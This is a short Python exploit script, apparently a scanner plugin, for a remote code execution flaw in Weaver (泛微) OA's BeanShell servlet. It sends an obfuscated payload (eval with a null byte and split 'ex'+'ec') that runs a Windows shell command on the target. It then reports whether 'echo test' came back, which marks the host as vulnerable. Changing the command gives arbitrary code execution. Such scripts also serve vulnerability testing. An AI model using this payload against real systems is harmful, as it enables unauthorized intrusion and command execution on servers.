#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 泛微OA 代码执行
referer: unknown
author: qianxiao996
description: 泛微OA 代码执行
'''
import sys
import requests
import warnings
def run(url):
        result = [' 泛微OA 代码执行','','']
        headers = {
            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 12_10) AppleWebKit/600.1.25 (KHTML, like Gecko) Version/12.0 Safari/1200.1.25',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
            'Accept-Language': 'en-US,en;q=0.5',
            'Content-Type': 'application/x-www-form-urlencoded'
        }
        target=url+'/weaver/bsh.servlet.BshServlet'
        try:    
            payload='bsh.script=eval%00("ex"%2b"ec(\\"cmd+/c+{}\\")");&bsh.servlet.captureOutErr=true&bsh.servlet.output=raw'.format('echo test')
            res=requests.post(url=target,data=payload,headers=headers,timeout=10)
            res.encoding=res.apparent_encoding
            if 'test' in res.text:
                result[2]=  '存在'
            else:
                result[2]=  '不存在'
        except:
            result[2]='不存在'
        return result

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = run(sys.argv[1])
